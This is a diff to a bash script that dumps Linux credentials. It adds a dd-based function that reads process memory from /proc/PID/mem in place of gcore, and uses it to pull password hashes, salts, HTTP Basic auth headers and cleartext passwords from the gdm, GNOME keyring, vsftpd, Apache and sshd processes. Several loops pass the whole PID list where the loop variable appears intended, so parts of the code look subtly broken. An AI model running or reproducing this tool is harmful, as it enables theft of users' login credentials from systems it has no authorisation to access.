@@ -14,6 +14,22 @@ fi
 #Store results to cleanup later
 export RESULTS=""
 
+dump_pid ()
+{
+	pid=$1
+	output_file=$2
+	grep -E "^[0-9a-f-]* r" /proc/$pid/maps | cut -d" " -f 1 |
+	while read memrange; do
+		memrange_start=`echo $memrange | cut -d"-" -f 1`;
+		memrange_start=`printf "%u\n" 0x$memrange_start`;
+		memrange_stop=`echo $memrange | cut -d"-" -f 2`;
+		memrange_stop=`printf "%u\n" 0x$memrange_stop`;
+		memrange_size=$(($memrange_stop - $memrange_start));
+		dd if=/proc/$pid/mem of=${output_file}.${pid} ibs=1 oflag=append conv=notrunc \
+			skip=$memrange_start count=$memrange_size > /dev/null 2>&1
+	done;
+}
+
 parse_pass ()
 {
 #$1 = DUMP, $2 = HASH, $3 = SALT, $4 = SOURCE
@@ -91,7 +107,7 @@ if [[ $(uname -a | awk '{print tolower($0)}') == *"kali"* ]]; then
 	SOURCE="[SYSTEM - GNOME]"
 	#get gdm-session-worker [pam/gdm-password] process
 	PID="$(ps -eo pid,command | sed -rn '/gdm-password\]/p' | awk 'BEGIN {FS = " " } ; { print $1 }')"
-	gcore -o /tmp/dump "$PID" >& /dev/null
+	dump_pid "$PID" /tmp/dump
 	HASH="$(strings "/tmp/dump.${PID}" | egrep -m 1 '^\$.\$.+$')"
 	SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 	DUMP="$(strings "/tmp/dump.${PID}" | egrep '^_pammodutil_getpwnam_root_1$' -B 5 -A 5)"
@@ -112,7 +128,7 @@ if [[ $(uname -a | awk '{print tolower($0)}') == *"ubuntu"* ]]; then
 	#if exists aka someone logged into gnome then extract...
 	if [[ $PID ]];then
 		while read -r pid; do
-			gcore -o /tmp/dump "$pid" >& /dev/null
+			dump_pid "$PID" /tmp/dump
 			HASH="$(strings "/tmp/dump.${pid}" | egrep -m 1 '^\$.\$.+$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/dump.${pid}" | egrep '^.+libgck\-1\.so\.0$' -B 10 -A 10)
@@ -134,10 +150,10 @@ if [[ -e "/etc/vsftpd.conf" ]]; then
 	#if exists aka someone logged into FTP then extract...
 	if [[ $PID ]];then
 		while read -r pid; do
-				gcore -o /tmp/vsftpd "$PID" >& /dev/null
-				HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
-				SALT="$(echo "$HASH" | cut -d'$' -f 3)"
-				DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
+			dump_pid "$PID" /tmp/vsftpd
+			HASH="$(strings "/tmp/vsftpd.${pid}" | egrep -m 1 '^\$.\$.+$')"
+			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
+			DUMP=$(strings "/tmp/vsftpd.${pid}" | egrep -B 5 -A 5 '^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$')
 			#Remove dupes to speed up processing
 			DUMP=$(echo "$DUMP" | tr " " "\n" |sort -u)
 			parse_pass "$DUMP" "$HASH" "$SALT" "$SOURCE"
@@ -157,7 +173,7 @@ if [[ -e "/etc/apache2/apache2.conf" ]]; then
 	if [[ "$PID" ]];then
 		#Dump all workers
 		while read -r pid; do
-			gcore -o /tmp/apache "${pid}"  >& /dev/null
+			dump_pid "$PID" /tmp/apache
 		done <<< "$PID"
 		#Get encoded creds
 		DUMP="$(strings /tmp/apache* | egrep '^Authorization: Basic.+=$' | cut -d' ' -f 3)"
@@ -181,7 +197,7 @@ if [[ -e "/etc/ssh/sshd_config" ]]; then
 	#if exists aka someone logged into SSH then dump
 	if [[ "$PID" ]];then
 		while read -r pid; do
-			gcore -o /tmp/sshd "$PID" >& /dev/null
+			dump_pid "$PID" /tmp/sshd
 			HASH="$(strings "/tmp/sshd.${pid}" | egrep -m 1 '^\$.\$.+$')"
 			SALT="$(echo "$HASH" | cut -d'$' -f 3)"
 			DUMP=$(strings "/tmp/sshd.${pid}" | egrep -A 3 '^sudo.+')
